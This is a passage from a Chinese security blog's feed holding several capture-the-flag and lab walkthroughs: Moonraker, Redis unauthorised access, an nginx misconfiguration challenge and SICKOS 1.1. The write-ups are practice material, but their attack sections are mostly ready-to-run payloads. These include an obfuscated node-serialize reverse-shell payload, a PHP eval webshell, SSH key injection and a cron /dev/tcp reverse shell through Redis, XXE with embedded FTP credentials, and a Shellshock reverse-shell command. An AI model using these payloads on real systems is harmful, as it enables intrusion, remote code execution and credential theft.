alt=""></p><p><code>http://10.10.10.136/robots.txt</code>什么也没有</p><p>访问</p><p><code>http://10.10.10.136/services/</code><br><img src="/4/4.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IF YOU ARE INTERESTED IN OUR SERVICES PLEASE SEND AN INQUIRY AND A SALES REP WILL GET WITH YOU IN UNDER LIGHT SPEED!</span><br><span class="line"></span><br><span class="line">WE PROMISE TO SHOOT FOR THE STARS FOR ALL OUR CUSTOMERS SERVICE NEEDS!</span><br><span class="line"></span><br><span class="line">如果您对我们的服务感兴趣，请发送询问和销售REP将以轻快的速度与您同行！ </span><br><span class="line"></span><br><span class="line">我们承诺为我们所有客户的服务需求拍摄明星！</span><br></pre></td></tr></table></figure></p><h2 id="寻找突破口"><a href="#寻找突破口" class="headerlink" title="寻找突破口"></a>寻找突破口</h2><p>我们看到了一个浏览器发送查询超链接<br><code>http://10.10.10.136/svc-inq/sales.html</code></p><p><img src="/4/5.png" alt=""><br>发送<br><code>&lt;img src=&quot;http://10.10.10.129/1.txt&quot;&gt;&lt;/img&gt;</code></p><p><img src="/4/6.png" alt=""></p><p>点击提交！我们已经重新启动了kali攻击机的Apache2服务，只需要等着靶机的管理员机器人访问我们提交的超链接，我们可以轻松地通过访问Apache2的access.log里看到后台管理的地址。</p><p>形成日志暴露出新的网页<br>用tail命令来查看<br><code>tail -f /var/log/apache2/access.log</code><br><img src="/4/7.png" alt=""></p><p>这里说一下因为做这个的时候我过了一个晚上，电脑重启了，所以ip动态变换了。现在靶机ip是10.10.10.137了。</p><p>找到了管理员查看最近服务请求的网页：<br>这个是我们刚刚发起的请求，因为查看后会消失，为了方便大家理解，我又重新发送了一遍<br><img src="/4/8.png" alt=""></p><p>点击<br><code>Back to Sales Admin Interface</code><br>返回销售管理界<br>发现CouchDB</p><h2 id="再次信息收集"><a href="#再次信息收集" class="headerlink" title="再次信息收集"></a>再次信息收集</h2><p><img src="/4/9.png" alt=""><br> 我的密码<br>提示：女朋友的名字+“x99”没有引号 </p><p>翻看资料<br>刚开始百度一直没找到，结果google一下就找到了</p><p><img src="/4/11.png" alt=""><br>所以密码就应该是dollyx99</p><p>继续翻看资料</p><p><img src="/4/10.png" alt=""><br>CouchDB提供了一个基于Web的方便控制面板它叫作：Futon<br>。只有SSH登录到您的服务器的用户才能访问Futon控制面板<br>感觉有搞头正好5984端口也打开了的</p><p>访问登陆界面</p><p><a href="http://10.10.10.137:5984/_utils/#login" target="_blank" rel="noopener">http://10.10.10.137:5984/_utils/#login</a></p><p><img src="/4/12.png" alt=""><br>用户名试下jaws密码就应该是dollyx99<br>登陆成功了</p><p>现在让我们来看看这3个数据库里面的文档</p><p><img src="/4/13.png" alt=""></p><p>在第三个中发现</p><p><img src="/4/14.png" alt=""></p><p>让我们复制并打开浏览器此链接</p><p><code>http://10.10.10.137/HR-Confidential/offer-letters.html</code></p><p>打开一个OFFER LETTER归档备份网页</p><p>发现这个pdf里面记录着每个人的各种信息包括密码<br><img src="/4/15.png" alt=""></p><p>那这个密码有什么用呢</p><h2 id="登陆nodejs"><a href="#登陆nodejs" class="headerlink" title="登陆nodejs"></a>登陆nodejs</h2><p>想到之前3000端口有bode.js的框架，看看有没有登陆页面</p><p><img src="/4/16.png" alt=""></p><p> 登陆这个用户看到hugo<br>Password: TempleLasersL2K</p><p><img src="/4/17.png" alt=""></p><p>访问<br><a href="http://10.10.10.137/accounting/hugo-manif.mp3" target="_blank" rel="noopener">http://10.10.10.137/accounting/hugo-manif.mp3</a></p><p>是一段音频</p><p><img src="/4/18.png" alt=""><br>暂时不知道啥用</p><h2 id="测试nodejs漏洞"><a href="#测试nodejs漏洞" class="headerlink" title="测试nodejs漏洞"></a>测试nodejs漏洞</h2><p>抓包测试下看有没有Nodejs的漏洞</p><p>发现cookie处可能可以利用，试试看</p><p><img src="/4/19.png" alt=""></p><p><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">nodejs反序列化</a></p><p>Node.js 的 node-serialize 库中存在一个漏洞，该漏洞通过传输 JavaScript IIFE，利用恶意代码（未信任数据）达到反序列化远程任意代码执行的效果</p><p><img src="/4/20.png" alt=""></p><h2 id="nodejs反序列化"><a href="#nodejs反序列化" class="headerlink" title="nodejs反序列化"></a>nodejs反序列化</h2><p>这里我用nodejs反弹shell脚本生成了一个exp</p><p>附上脚本地址：<a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank" rel="noopener">nodejs反序列化</a></p><p><img src="/4/20.png" alt=""><br>现在我们生成反序列化的 payload，并在函数后面添加 IIFE 括号 ()，<br><code>{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,48,46,49,50,57,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()&quot;}</code><br>为啥要结尾加括号呢，因为如果我们在函数后使用 IIFE 括号 () ，在对象被创建时，函数就会马上被调用。有点类似于 C 中的类构造函数</p><p>payload还要经过一次base64加密，用burpsuite发起请求<br><img src="/4/21.png" alt=""></p><p>kali开启监听</p><p><code>nc  -lvp 1337</code></p><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p><img src="/4/22.png" alt=""></p><p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>我们随即用Python调用pty建立原生终端</p><p>接下来一番搜索<br>发现/var/mail下有各自的文件，但是没有权限</p><p><img src="/4/24.png" alt=""></p><p>想办法获取用户权限</p><h2 id="读取CouchDB配置"><a href="#读取CouchDB配置" class="headerlink" title="读取CouchDB配置"></a>读取CouchDB配置</h2><p>知道关于CouchDB的配置之后，我们遇到CouchDB的默认安装目录是 /opt/couchdb并读取该目录的配置文件etc/local.ini</p><p><code>tail /opt/couchdb/etc/local.ini</code></p><p><img src="/4/23.png" alt=""></p><p>我们找到个登陆凭证</p><p><code>Username: hugoPassword: 321Blast0ff!!</code></p><p>登陆后随即访问刚刚的文件发现里面有root用户的hash值</p><p><img src="/4/25.png" alt=""></p><h2 id="Get-ROOT"><a href="#Get-ROOT" class="headerlink" title="Get ROOT"></a>Get ROOT</h2><p>开始破解hash</p><p>创建一个新文件名叫hash，将密码复制粘贴到hash里。</p><p>用john开始破解</p><p><code>john hash</code>结果如下</p><p><img src="/4/26.png" alt=""></p><p>由图可知root的密码为cyber</p><p>结果发现失败了</p><p>原来是少看了一个线索，</p><p>还是刚刚那个/var/mail里的hugo文件里</p><p><img src="/4/27.png" alt=""></p><p>提示hash解出来的密码要加VR00M</p><p>所以root的密码为cyberVR00M</p><h2 id="Get-flag"><a href="#Get-flag" class="headerlink" title="Get flag"></a>Get flag</h2><p>我们在/root目录发现flag.txt</p><p>cat flag.txt</p><p><img src="/4/28.png" alt=""></p><p>总算成功了！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试-Moonraker&quot;&gt;&lt;a href=&quot;#渗透测试-Moonraker&quot; class=&quot;headerlink&quot; title=&quot;渗透测试|Moonraker&quot;&gt;&lt;/a&gt;渗透测试|Moonraker&lt;/h2&gt;&lt;h2 id=&quot;题记&quot;&gt;&lt;a href=&quot;#题记&quot;
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>redis未授权</title>
    <link href="http://yoursite.com/2019/04/11/redis%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
    <id>http://yoursite.com/2019/04/11/redis未授权/</id>
    <published>2019-04-11T11:45:00.000Z</published>
    <updated>2020-04-07T16:16:12.393Z</updated>
    
    <content type="html"><![CDATA[<h1 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用 Redis 自身的提供的config 命令，可以进行写文件操作</p><p>攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；<br>（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>1、访问敏感数据<br>2、eval执行lua代码，数据备份写后门<br>3、redis以root身份运行，给root账户写入ssh公钥文件，sshxie’ru受害服务器</p><h2 id="浮现"><a href="#浮现" class="headerlink" title="浮现"></a>浮现</h2><p><img src="/redis未授权/1585189106303.png" alt="Alt text"><br>从登录的结果可以看出该redis服务对公网开放，且未启用认证<br>config set dir /var/www/html<br>config set dbfilename redis.php<br>set webshell “&lt;?php phpinfo()?&gt;”<br>save<br>验证<br><img src="/redis未授权/1585189274477.png" alt="Alt text"></p><p>当数据库过大时，redis写shell的小技巧：</p><p>&lt;?php<br>set_time_limit(0);<br>$fp=fopen(‘’1.php,’w’);<br>fwrite($fp,’&lt;?php @eval($_POSTP[\”a\”);?&gt;’);<br>exit();<br>?&gt;</p><h3 id="公私钥认证获取root权限"><a href="#公私钥认证获取root权限" class="headerlink" title="公私钥认证获取root权限"></a>公私钥认证获取root权限</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在数据库插入一条数据，将本机的公钥作为value，key随意，修改数据库的默认路径为/root/.ssh，和默认的缓冲文件authorized,keys，把缓存的数据保存在文件中，在服务器端/root/.ssh生一个授权的key</p><p>靶机中开启redis服务：redis-server /etc/redis.conf</p><p>在靶机中执行  mkdir /root/.ssh  命令，创建ssh公钥存放目录</p><p>在攻击机中生成ssh公钥和私钥，密码设置为空：<br>ssh-keygen -t rsa</p><p><img src="/redis未授权/1585189614044.png" alt="Alt text"><br>将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合）,再把key.txt文件内容写入目标主机的缓冲里：<br>(echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; key.txt<br><img src="/redis未授权/1585190621225.png" alt="Alt text"></p><p>cat /root/.ssh/key.txt | redis-cli -h 10.10.10.129 -x set xxx<br><img src="/redis未授权/1585190679714.png" alt="Alt text"></p><p>设置redis的备份路径为/root/.ssh和保存文件名authorized_keys</p><p>config set dir /root/.ssh</p><p>config set dbfilename authorized_keys<br><img src="/redis未授权/1585190776512.png" alt="Alt text"></p><p><img src="/redis未授权/1585191453155.png" alt="Alt text"></p><pre><code>将数据保存在服务器硬盘上（缓存里的数据key.txt）</code></pre><p>save<br><img src="/redis未授权/1585191557680.png" alt="Alt text"><br>    这时候用ssh远程连接：</p><pre><code>可以在centos这边进入/root/.ssh目录，看一下authorized_keys的文件内容</code></pre><p><img src="/redis未授权/1585191608687.png" alt="Alt text"></p><p>可以看到不用密码就可以直接远程登录</p><h2 id="在crontab里写定时任务，反弹shell"><a href="#在crontab里写定时任务，反弹shell" class="headerlink" title="在crontab里写定时任务，反弹shell"></a>在crontab里写定时任务，反弹shell</h2><p>原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名</p><p>/redis未授权/redis-cli -h 192.168.152.128<br>set xxx “\n\n<em>/1 </em> <em> </em> * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n”<br>config set dir /var/spool/cron<br>config set dbfilename root<br>save</p><h2 id="redis执行命令"><a href="#redis执行命令" class="headerlink" title="redis执行命令"></a>redis执行命令</h2><p>　redis 2.6以前的版本内置了lua脚本环境<br>    在客户端连接redis服务器并执行hello.lua</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;redis未授权&quot;&gt;&lt;a href=&quot;#redis未授权&quot; class=&quot;headerlink&quot; title=&quot;redis未授权&quot;&gt;&lt;/a&gt;redis未授权&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>nginx的秘密wp</title>
    <link href="http://yoursite.com/2019/04/03/nginx%E7%9A%84%E7%A7%98%E5%AF%86wp/"/>
    <id>http://yoursite.com/2019/04/03/nginx的秘密wp/</id>
    <published>2019-04-03T03:24:00.000Z</published>
    <updated>2020-04-07T15:43:53.633Z</updated>
    
    <content type="html"><![CDATA[<p>nginx的秘密wp</p><p>刚拿到手还以为是sql约束攻击，发现测试未果</p><p>看题目为nginx的秘密<br>想到可能和nginx的配置有关<br>于是百度搜索nginx配置漏洞<br><a href="https://www.freebuf.com/articles/web/149761.html" target="_blank" rel="noopener">Nginx不安全配置可能导致的安全漏洞 </a></p><ol><li>目录遍历漏洞<br>Nginx默认是不允许列出整个目录的。如需此功能，打开nginx.conf文件，在location server 或 http段中加入<br>autoindex on;</li><li>$uri导致的CRLF注入漏洞(理论上，只要是可以设置HTTP头的场景都会出现这个问题。)，$uri 和  $document_uri表示的是解码以后的请求路径，不带参数,$request_uri表示的是完整的URI（没有解码）</li><li>任意文件读取</li><li>解析漏洞<br>发现ngnix的static配置出现了任意文件读取的漏洞于是<br>下载ngnix的配置文件/static../etc/nginx/nginx.conf </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;</span><br><span class="line"></span><br><span class="line">    limit_conn_zone $binary_remote_addr zone=conn:10m;</span><br><span class="line">    limit_req_zone  $binary_remote_addr zone=allips:10m rate=2r/s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 4455 default_server;</span><br><span class="line">        server_name localhost;</span><br><span class="line"></span><br><span class="line">        location /static &#123;</span><br><span class="line">            alias /home/;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~* \.(css|js|gif|png)&#123;</span><br><span class="line">            proxy_cache             my_cache;</span><br><span class="line">            proxy_cache_valid       200 30s;</span><br><span class="line">            proxy_pass              http://bugweb.app:8000;</span><br><span class="line">            proxy_set_header        Host $host:$server_port;</span><br><span class="line">            proxy_ignore_headers    Expires Cache-Control Set-Cookie;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            limit_conn conn 10;</span><br><span class="line">            proxy_pass       http://bugweb.app:8000;</span><br><span class="line">            proxy_set_header Host $host:$server_port;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>location ~* \.(css|js|gif|png)</code><br>匹配到~* .(css|js|gif|png)就进行缓存。</p><p>由于定义缓存文件名的proxy_cache_key未设置，则使用默认值 $scheme$proxy_host$request_uri，即文件名形式为MD5($scheme$proxy_host$request_uri)</p><p><code>proxy_cache_path /tmp/mycache levels=1:2</code><br>因为levels=1:2<br>proxy_cache_path 缓存的路径为/tmp/mycache下的两级目录下第一级目录名取MD5值的最后一个字符，第二级目录名取MD5值的倒数2、3个字符<br>例如/tmp/mycache/c/a2/2b236ce5a5d567d4642800a739429a2c<br>访问缓存文件</p><p>根据提示随便测editxxx发现也映射到相同的页面。猜测后台路由的逻辑是只要访问的是以edit开头都相当于访问edit</p><p><a href="http://149.129.103.103:4455/user/admin" target="_blank" rel="noopener">http://149.129.103.103:4455/user/admin</a><br>发现越权<br>提示：-syc-note 我已经把所有秘密写进secret plan了233333 </p><p>于是提交漏洞处提交</p><p><a href="http://149.129.103.103:4455/write_plan/2.js/" target="_blank" rel="noopener">http://149.129.103.103:4455/write_plan/2.js/</a></p><p>访问</p><p><a href="http://149.129.103.103:4455/write_plan/2.js/" target="_blank" rel="noopener">http://149.129.103.103:4455/write_plan/2.js/</a></p><p>或者</p><p><a href="http://149.129.103.103:4455/static../../tmp/mycache/c/a2/2b236ce5a5d567d4642800a739429a2c" target="_blank" rel="noopener">http://149.129.103.103:4455/static../../tmp/mycache/c/a2/2b236ce5a5d567d4642800a739429a2c</a></p><p>得到：<br><figure class="highlight plain"><figcaption><span>months ago 明晚维同网段的ftp服务器，syc10ver Eec5TN9fruOOTp2G。密码这么长真是难记，备注一下~。 ```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">利用xxe</span><br></pre></td></tr></table></figure></p><p>a few seconds ago<br>a few seconds ago 172.19.0.1 0x1 0x2 02:42:ec:2a:71:fb <em> eth0<br>a few seconds ago<br>a few seconds ago 172.19.0.2 0x1 0x2 02:42:ac:13:00:02 </em> eth0<br>a few seconds ago<br>a few seconds ago 172.19.0.4 0x1 0x2 02:42:ac:13:00:04 * eth0<br>a few seconds ago<br>a few seconds ago IP address HW type Flags HW address Mask Device<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发现存在172.18.0.1~4，</span><br><span class="line">读目录，</span><br></pre></td></tr></table></figure></p><p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;<br>&lt;!DOCTYPE person [&lt;!ENTITY remote SYSTEM<br>“<a href="ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.2/&quot;&gt;]&gt;" target="_blank" rel="noopener">ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.2/&quot;&gt;]&gt;</a></p><plans><br>    <plan><br>        <content>payload &remote;</content><br>    </plan><br></plans><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读flag</span><br></pre></td></tr></table></figure><p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;<br>&lt;!DOCTYPE person [&lt;!ENTITY remote SYSTEM<br>“<a href="ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.2/flag327a6c4304ad5938eaf0efb6cc3e53dc&quot;&gt;]&gt;" target="_blank" rel="noopener">ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.2/flag327a6c4304ad5938eaf0efb6cc3e53dc&quot;&gt;]&gt;</a></p><p><plans><br>    <plan><br>        <content>payload &remote;</content><br>    </plan><br></plans><br><code>`</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;nginx的秘密wp&lt;/p&gt;
&lt;p&gt;刚拿到手还以为是sql约束攻击，发现测试未果&lt;/p&gt;
&lt;p&gt;看题目为nginx的秘密&lt;br&gt;想到可能和nginx的配置有关&lt;br&gt;于是百度搜索nginx配置漏洞&lt;br&gt;&lt;a href=&quot;https://www.freebuf.com/ar
      
    
    </summary>
    
      <category term="比赛" scheme="http://yoursite.com/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>SICKOS</title>
    <link href="http://yoursite.com/2019/03/12/SICKOS/"/>
    <id>http://yoursite.com/2019/03/12/SICKOS/</id>
    <published>2019-03-12T01:24:00.000Z</published>
    <updated>2020-04-07T15:58:37.063Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SICKOS-1-1-CTF"><a href="#SICKOS-1-1-CTF" class="headerlink" title="SICKOS 1.1 - CTF"></a>SICKOS 1.1 - CTF</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>sick0s1.1.7z (Size: 623 MB)</p><p>Download (Mirror): <a href="https://download.vulnhub.com/sickos/sick0s1.1.7z" target="_blank" rel="noopener">https://download.vulnhub.com/sickos/sick0s1.1.7z</a></p><p>Download (Torrent): <a href="https://download.vulnhub.com/sickos/sick0s1.1.7z.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/sickos/sick0s1.1.7z.torrent</a>     ( Magnet)</p><p>攻击机 Kali IP 192.168.10.128</p><p>靶机在同一C段下 IP  192.168.10.130</p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>使用命令<code>nmap -sP 192.168.10.0/24</code></p><p><img src="/6/1.png" alt=""></p><p>可知靶机的ip是  192.168.10.130</p><h2 id="端口服务扫描"><a href="#端口服务扫描" class="headerlink" title="端口服务扫描"></a>端口服务扫描</h2><p><code>nmap -p- -A -T4 192.168.10.130</code></p><p><img src="/6/2.png" alt=""></p><p>可知开了22 ssh服务</p><p>3128 http代理服务</p><p>8080 http代理服务</p><p>既然开启了代理服务，那么我们就给浏览器配上代理</p><p><img src="/6/3.png" alt=""></p><p>访问本地127.0.0.1看看</p><p><img src="/6/4.png" alt=""></p><p>存在web服务源代码里没什么有用信息</p><p>看看robots.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Dissalow: /wolfcms</span><br></pre></td></tr></table></figure><p>有个目录访问之</p><p><code>127.0.0.1/wolfcms</code></p><p>可以看出是一个cms</p><p>决定运行Nikto，看看有什么漏洞</p><p>Nikto是一个扫描Web服务漏洞的一个工具，也是使用最广泛的扫描工具之一</p><p><code>nikto -useproxy 192.168.10.130:3128 -h 127.0.0.1</code></p><p>挂上代理扫描本地可以扫出如下漏洞</p><p><img src="/6/5.png" alt=""></p><p>准备利用他扫出的CVE-2014-6271漏洞试试</p><p>该漏洞是一个Shellshock</p><p>漏洞影响：GNU Bash &lt;= 4.3，此漏洞可能会影响到使用ForceCommand功能的OpenSSH<br>sshd、使用mod_cgi或mod_cgid的Apache服务器、DHCP客户端、其他使用Bash作为解释器的应用等。GNU</p><p>该工具还告诉了我们利用方式的链接</p><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271" target="_blank" rel="noopener">CVE-2014-6271</a></p><p><a href="https://www.freebuf.com/news/48331.html" target="_blank" rel="noopener">我参考的文章</a></p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>执行如下命令，验证漏洞是否存在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -U &quot;() &#123; test;&#125;;echo \&quot;Content-type: text/plain\&quot;; echo; /bin/bash -c &apos;echo vulnerable&apos;&quot; http://127.0.0.1/cgi-bin/status -e use_proxy=yes -e http_proxy=192.168.10.130:3128</span><br></pre></td></tr></table></figure></p><p>-U, –user-agent=AGENT 标志为 AGENT</p><p><code>cat status</code></p><p><img src="/6/6.png" alt=""></p><p>显示vulnerable可以利用 </p><p>这样我们修改payload为反弹shell的命令就可以获取我们的shell</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>现在kali开启nc监听 监听4444端口</p><p><code>nc -lvp 4444</code></p><p>然后执行反弹shell的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -U &quot;() &#123; test;&#125;;echo \&quot;Content-type: text/plain\&quot;; echo; /bin/bash -i &gt;&amp; /dev/tcp/192.168.10.128/4444 0&gt;&amp;1&quot; http://127.0.0.1/cgi-bin/status -e use_proxy=yes -e http_proxy=192.168.10.130:3128</span><br></pre></td></tr></table></figure><p><img src="/6/7.png" alt=""></p><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>执行完后获得一个www-data的权限的shell</p><p><img src="/6/8.png" alt=""></p><p>瞬即查看/home里有没有有用的文件，发现没有什么有用的东西</p><p><code>cd /var/www</code>看看有什么东西</p><p><img src="/6/9.png" alt=""></p><p>发现了一个配置文件config.php</p><p><img src="/6/10.png" alt=""></p><p>找到了数据库配置密码<br><code>root john@123</code></p><p>试下会不会是弱口令</p><p>尝试切换用户，发现报错了</p><h2 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h2><p>想起来了打开了ssh服务的22端口了的。尝试ssh登陆之</p><p><img src="/6/11.png" alt=""></p><p><code>ssh sickos@192.168.10.130</code></p><p><img src="/6/12.png" alt=""></p><p>然后登进去了！</p><p>id查看下用户权限</p><p>发现不是root权限。但是可以执行sudo命令</p><p>于是sudo -s切换到root</p><p>然后我们就获取了root权限</p><p><img src="/6/13.png" alt=""></p><h2 id="查看flag"><a href="#查看flag" class="headerlink" title="查看flag"></a>查看flag</h2><p><code>cd /root</code></p><p>ls发现a0216ea4d51874464078c618298b1367.txt </p><p>应该是就是flag了</p><p><code>cat  a0216ea4d51874464078c618298b1367.txt</code></p><p><img src="/6/14.png" alt=""></p><p>成功！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SICKOS-1-1-CTF&quot;&gt;&lt;a href=&quot;#SICKOS-1-1-CTF&quot; class=&quot;headerlink&quot; title=&quot;SICKOS 1.1 - CTF&quot;&gt;&lt;/a&gt;SICKOS 1.1 - CTF&lt;/h1&gt;&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透测试MERCY</title>
    <link href="http://yoursite.com/2019/02/23/MERCY/"/>
    <id>http://yoursite.com/2019/02/23/MERCY/</id>
    <published>2019-02-23T01:25:00.000Z</published>
    <updated>2020-04-07T15:57:23.285Z</updated>
    
